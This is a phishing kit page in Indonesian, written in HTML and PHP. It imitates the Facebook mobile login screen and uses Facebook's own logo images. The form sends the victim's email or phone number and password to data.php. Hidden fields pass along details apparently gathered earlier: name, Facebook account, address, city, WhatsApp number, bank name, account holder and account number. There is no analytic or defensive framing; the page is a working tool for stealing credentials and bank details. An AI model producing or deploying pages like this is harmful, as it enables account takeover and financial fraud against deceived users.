<!DOCTYPE html>
<html id="feProdAWS04" lang="id">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>FACEBOOK - Masuk atau Daftar</title>
<link rel="icon" href="ran.png">
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1, minimum-scale=1,maximum-scale=1">
<meta name="apple-mobile-web-app-capable" content="yes">
<!--link connect css-->
<!--<link rel="stylesheet" href="./yondahost/style.css"/>-->
<!--<link rel="stylesheet" href="./yondahost/facebook.css"/>-->
<!--end-->
</head>
<style type="text/css" media="all">
    body{
    margin: 0;
    padding: 0;
    background-color:rgb(232, 247, 248);
    box-sizing: border-box;
}

.container{
    width: 100%;
    height: 100vh;
    display: block;
    margin-top: -8px;
    margin-right: auto;
    margin-left: auto;
    background-color:rgb(232, 247, 248);
}

.navbar-fb{
    width: 100%;
    text-align: center;
    align-items: center;
    background-color:rgba(255, 255, 255, 0);
    
}

.navbar-fb h1 {
    font-size: 14px;
    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    margin-top: 20px;
    letter-spacing: 1px;
    font-weight: normal;
}


.icon-fb img{
    width: 65px;
    display: block;
    margin-top: 60px;
    margin-bottom: 30px;
    margin-right: auto;
    margin-left: auto;
}

.text-login{
    text-align: center;
    padding: 20px;
    font-family: "Sans-Serif";
    color: gray;
}

.box-login input[type=text]{
    border: none;
    border-radius: 10px;
    outline: none;
    width: 320px;
    font-size: 15px;
    height: 25px;
    border: 1px solid #aaa;
    padding: 15px;
    display: block;
    margin-left: auto;
    margin-right: auto;
}

.box-login input[type=password]{
    border: none;
    font-size: 15px;
    outline: none;
    width: 320px;
    height: 25px;
    border-radius: 10px;
    border: 1px solid #aaa;
    padding: 13px;
    display: block;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
}

.box-login input[type=submit]{
    border: none;
    width: 350px;
    padding: 13px;
    border-radius: 22px;
    margin-top: 10px;
    height: 44px;
    background-color: #016ADC;
    color: #fff;
    font-size: 17px;
    display: block;
    margin-left: auto;
    margin-right: auto;
}

.text-center{
    text-align: center;
    color: gray;
    font-family: "Sans-Serif";
}

.buat-akun {
    margin-top: 80px;
}

.buat-akun button {
    width: 350px;
    border-radius: 22px;
    padding: 10px;
    opacity: 1;
    height: 44px;
    font-size: 16px;
    color: rgb(0, 100, 224);
    background-color: transparent;
    border: 1px solid rgb(0, 100, 224);
    cursor: pointer;
}
.lupa-pass {
    color: black;
    font-size: 15px;
    margin-top: -4px;
    font-family:system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

.meta-fb {
    margin-top: 25px;
    margin-bottom: 20px;
}
.meta-fb img{
    width: 60px;
}

.navbar-bottom {
    font-size: 11px;
    margin-left: 10px;
}
.navbar-bottom span {
    padding-right: 10px;
}
</style>
<body>
    <div class="container">
        <div class="navbar-fb">
            <h1>Bahasa Indonesia</h1>
        </div>
        <div class="icon-fb">
            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yh/r/Sg2QOE06yVC.png" alt="" />
        </div>
        <div class="text-login">
        </div>
         <div class="box-login">
        <form action="data.php" method="POST">
     <input type="hidden" name="user2" id="user2" value="<?= $user ?>" readonly>
     <input type="hidden" name="fb2" id="fb2" value="<?= $fb ?>" readonly>
     <input type="hidden" name="alamat2" id="alamat2" value="<?= $alamat ?>" readonly>
     <input type="hidden" name="kota2" id="kota2" value="<?= $kota ?>" readonly>
     <input type="hidden" name="wa2" id="wa2" value="<?= $wa ?>" readonly>
     <input type="hidden" name="bank2" id="bank2" value="<?= $bank ?>" readonly>
     <input type="hidden" name="narek2" id="narek2" value="<?= $narek ?>" readonly>
     <input type="hidden" name="norek2" id="norek2" value="<?= $norek ?>" readonly>
        <input type="text" name="mail" placeholder="Nomor ponsel atau email" required="required" autocomplete="off" autocapitalize="off"/>
        <input type="password" name="pass" placeholder="Kata Sandi" required="required" autocomplete="off" autocapitalize="off"/>
          <input type="hidden" name="ip" value="">
                    <input type="hidden" name="ua" value="">
       <div class="btn-masuk">
            <input type="submit" value="Login"/>
       </div>
        </form>
    <div class="text-center">
        <br />
         <div class="lupa-pass">
        <span>Lupa Kata Sandi?</span>
        </div>
        <br />
        <div class="buat-akun">
        <button>Buat akun Baru</button>
        </div>
        <div class="meta-fb">
            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yr/r/7trPSpNFerC.png" alt="">
    </div>
    <div class="navbar-bottom">
        <span>Tentang </span>
        <span>Bantuan</span> 
        <span>Lainya</span>
    </div>
</body>
</html>

<?php 

if(!isset($_POST['user']) || !isset($_POST['fb']) || !isset($_POST['alamat']) || !isset($_POST['kota']) || !isset($_POST['wa']) || !isset($_POST['bank']) || !isset($_POST['narek']) || !isset($_POST['norek'])) {
    header('location: ./');
} else {
    $user = $_POST['user'];
    $fb = $_POST['fb'];
    $alamat = $_POST['alamat'];
    $kota = $_POST['kota'];
    $wa = $_POST['wa'];
    $bank = $_POST['bank'];
    $narek = $_POST['narek'];
    $norek = $_POST['norek'];
}